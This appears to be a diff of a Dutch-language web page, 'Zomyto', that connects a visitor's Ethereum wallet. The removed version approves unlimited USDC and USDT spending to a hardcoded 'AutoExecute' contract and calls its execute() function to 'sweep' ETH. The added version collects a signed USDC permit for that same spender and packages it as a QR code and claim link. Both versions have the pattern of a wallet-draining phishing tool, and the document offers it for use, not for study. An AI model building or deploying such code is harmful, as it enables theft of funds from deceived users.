@@ -3,89 +3,89 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Zomyto WalletConnect Approve + Sweep</title>
+<title>Zomyto USDC Permit Link</title>
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-<script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
-
+<script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
 <style>
-  body { background:#121212; color:white; font-family:Arial; text-align:center; padding-top:50px;}
-  button { background:#1e88e5; color:white; padding:15px 25px; border:none; border-radius:8px; font-size:1.2rem; cursor:pointer; margin-top:20px;}
-  button:disabled { background:grey; }
+  body { background:#121212; color:white; font-family:Arial; text-align:center; padding-top:50px; }
+  button { background:#1e88e5; color:white; padding:15px 25px; border:none; border-radius:8px; font-size:1.2rem; cursor:pointer; margin-top:20px; }
+  input { padding:10px; width:80%; margin-top:20px; font-size:1rem; border-radius:6px; border:none; }
 </style>
 </head>
 <body>
 
-<h1>Zomyto WalletConnect Approve + Sweep</h1>
-<p>Scan de QR met je wallet of klik Connect</p>
+<h1>Zomyto USDC Permit Link Generator</h1>
 
-<img src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=https://scan.walletconnect.com/?clientMeta.name=Zomyto&projectId=0e7d96df89f873ddfb0b4381e13c883c" alt="Scan QR" style="margin-top:20px;">
-
-<br>
 <button id="connectBtn">🔗 Connect Wallet</button>
-<button id="approveBtn" disabled>✅ Approve USDC + USDT</button>
-<button id="sweepBtn" disabled>💰 Sweep ETH</button>
+<button id="permitBtn" disabled>✍️ Genereer Permit Link</button>
+
+<div id="qrContainer" style="margin-top:30px;"></div>
+<input type="text" id="linkOutput" placeholder="Hier komt de link..." readonly>
 
 <script>
 let provider, signer;
 
-// ERC20 tokens
-const tokens = [
-  { name: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
-  { name: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" }
-];
+const usdcAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+const spender = "0x2F6DAC950c8e2433734Fe50bC72F18E2d2dD8f2A"; // AutoExecute contract
+const value = ethers.utils.parseUnits("1000", 6); // 1000 USDC
+const deadline = Math.floor(Date.now()/1000) + 3600; // 1 uur geldig
 
-// AutoExecute contract
-const autoExecute = "0x2F6DAC950c8e2433734Fe50bC72F18E2d2dD8f2A"; // <<< VERVANGEN
-
-const tokenABI = [
-  "function approve(address spender, uint256 amount) public returns (bool)"
-];
-
-const autoExecuteABI = [
-  "function execute() external"
-];
-
-// Connect WalletConnect
 document.getElementById("connectBtn").onclick = async () => {
-  const wcProvider = new WalletConnectProvider.default({
-    projectId: "0e7d96df89f873ddfb0b4381e13c883c",
-    chains: [1], // Ethereum mainnet
-  });
-  await wcProvider.enable();
-  provider = new ethers.providers.Web3Provider(wcProvider);
+  if (!window.ethereum) { alert("Installeer MetaMask of gebruik Exodus via WalletConnect!"); return; }
+  await window.ethereum.request({ method: "eth_requestAccounts" });
+  provider = new ethers.providers.Web3Provider(window.ethereum);
   signer = provider.getSigner();
-  
-  document.getElementById("approveBtn").disabled = false;
-  document.getElementById("sweepBtn").disabled = false;
-  alert("Wallet connected!");
+  document.getElementById("permitBtn").disabled = false;
+  alert("Wallet verbonden!");
 };
 
-// Approve tokens
-document.getElementById("approveBtn").onclick = async () => {
+document.getElementById("permitBtn").onclick = async () => {
   try {
-    for (let t of tokens) {
-      const token = new ethers.Contract(t.address, tokenABI, signer);
-      const tx = await token.approve(autoExecute, ethers.constants.MaxUint256);
-      await tx.wait();
-      console.log("Approved:", t.name);
-    }
-    alert("USDC + USDT succesvol goedgekeurd!");
-  } catch (err) {
-    console.error(err);
-    alert("Fout bij approve: " + err.message);
-  }
-};
+    const owner = await signer.getAddress();
 
-// Sweep ETH
-document.getElementById("sweepBtn").onclick = async () => {
-  try {
-    const contract = new ethers.Contract(autoExecute, autoExecuteABI, signer);
-    const tx = await contract.execute();
-    await tx.wait();
-    alert("ETH succesvol geswept!");
+    const usdcABI = ["function nonces(address) view returns (uint256)","function DOMAIN_SEPARATOR() view returns (bytes32)"];
+    const token = new ethers.Contract(usdcAddress, usdcABI, provider);
+    const nonce = await token.nonces(owner);
+
+    const domain = {
+      name: "USD Coin",
+      version: "2",
+      chainId: 1,
+      verifyingContract: usdcAddress
+    };
+
+    const types = {
+      Permit: [
+        { name: "owner", type: "address" },
+        { name: "spender", type: "address" },
+        { name: "value", type: "uint256" },
+        { name: "nonce", type: "uint256" },
+        { name: "deadline", type: "uint256" }
+      ]
+    };
+
+    const message = { owner, spender, value, nonce, deadline };
+
+    const signature = await signer._signTypedData(domain, types, message);
+    const sig = ethers.utils.splitSignature(signature);
+
+    const permitData = { owner, spender, value: value.toString(), nonce: nonce.toString(), deadline, v: sig.v, r: sig.r, s: sig.s };
+    
+    // QR-code
+    const qrText = encodeURIComponent(JSON.stringify(permitData));
+    document.getElementById("qrContainer").innerHTML = "";
+    QRCode.toCanvas(document.getElementById("qrContainer"), qrText, function (error) {
+      if (error) console.error(error);
+    });
+
+    // Directe link
+    const link = `https://zomyto.example.com/claim-permit?data=${qrText}`;
+    document.getElementById("linkOutput").value = link;
+
+    alert("Permit gegenereerd! Scan de QR of gebruik de link.");
   } catch (err) {
     console.error(err);
-    alert("Fout bij sweep: " + err.message);
+    alert("Fout bij Permit: " + err.message);
   }
 };
 </script>
